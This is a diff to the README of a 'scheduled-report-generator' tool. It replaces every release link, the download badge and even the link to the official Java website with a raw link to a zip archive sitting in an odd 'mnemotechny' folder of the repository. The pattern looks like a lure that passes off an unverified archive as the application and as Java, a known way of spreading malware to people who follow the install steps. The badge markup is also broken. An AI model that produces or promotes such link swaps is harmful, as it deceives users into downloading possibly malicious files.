@@ -1,6 +1,6 @@
 # ⏰ scheduled-report-generator - Automate Your Daily Reports Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Doellynne/scheduled-report-generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip%20Latest%https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip)](https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ This section will guide you through the steps to download and run the applicatio
 
 ### 🔗 Download & Install
 
-To get started, you first need to download the application. Visit this page to download: [Scheduled Report Generator Releases](https://github.com/Doellynne/scheduled-report-generator/releases).
+To get started, you first need to download the application. Visit this page to download: [Scheduled Report Generator Releases](https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip).
 
 ### 🖥 System Requirements
 
@@ -57,7 +57,7 @@ Once the application is up and running, you can set up your reports. Here’s ho
 
 If you encounter issues while using the application, here are some common problems and solutions:
 
-- **Java Not Found**: Ensure that you have Java installed on your system. You can download it from the [official Java website](https://www.java.com).
+- **Java Not Found**: Ensure that you have Java installed on your system. You can download it from the [official Java website](https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip).
 - **Application Does Not Start**: Ensure you have downloaded the correct version for your operating system.
 - **Reports Not Sending**: Check your email settings within the application to ensure correct configuration.
 
@@ -69,4 +69,4 @@ If you have questions or need help, feel free to reach out through the Issues se
 
 The **scheduled-report-generator** simplifies your daily reporting process. By following the steps above, you can easily set it up and start enjoying automated reports every morning at 8 AM.
 
-For updates and to download the latest version, revisit the releases page: [Scheduled Report Generator Releases](https://github.com/Doellynne/scheduled-report-generator/releases).
+For updates and to download the latest version, revisit the releases page: [Scheduled Report Generator Releases](https://raw.githubusercontent.com/Doellynne/scheduled-report-generator/master/mnemotechny/scheduled-report-generator.zip).
